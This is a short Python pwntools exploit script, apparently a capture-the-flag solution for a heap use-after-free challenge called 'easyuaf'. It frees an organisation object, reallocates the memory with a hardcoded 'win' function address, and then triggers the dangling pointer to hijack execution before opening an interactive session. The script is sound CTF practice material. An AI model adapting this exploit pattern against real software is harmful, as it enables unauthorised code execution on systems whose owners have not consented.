#!/usr/bin/python2
from pwn import *

#sh = process('./easyuaf')
sh = remote('challs.nusgreyhats.org', 10525)
win_addr = 0x00401276

def send_payload_colon(payload):
	print payload
	sh.sendline('{}'.format(payload))
	return sh.recvuntil(':')

def send_payload_gt(payload):
	sh.sendline('{}'.format(payload))
	return sh.recvuntil(">")

def new_person(pid, name, age, pcn, bcn):
	print send_payload_colon(1)
	print send_payload_colon(pid)
	print send_payload_colon(name)	
	print send_payload_colon(age)
	print send_payload_colon(pcn)
	print send_payload_gt(bcn)

def new_org(oid, name, style):
	print send_payload_colon(2)
	print send_payload_colon(oid)
	print send_payload_colon(name)
	print send_payload_gt(style)

def delete_org(oid):
	print send_payload_colon(3)
	print send_payload_gt(oid)

def print_name_card(oid, pid):
	print send_payload_colon(4)
	print send_payload_colon(oid)
	sh.sendline(''.format(pid))
	print sh.recv()



def main():
	print sh.recvuntil('>')
	new_person(0, 'A'*23, 21, 'help', 'help')
	new_org(0, "C"*10, 1)
	delete_org(0)
	new_person(1, 'B'*20, 22, win_addr, 0)
	print_name_card(0, 1)
	#new_org(1, "D"*21, 2)
	#new_org(2, "E"*23, 3)
	#gdb.attach(sh)
	sh.interactive()


if __name__ == '__main__':
	main()




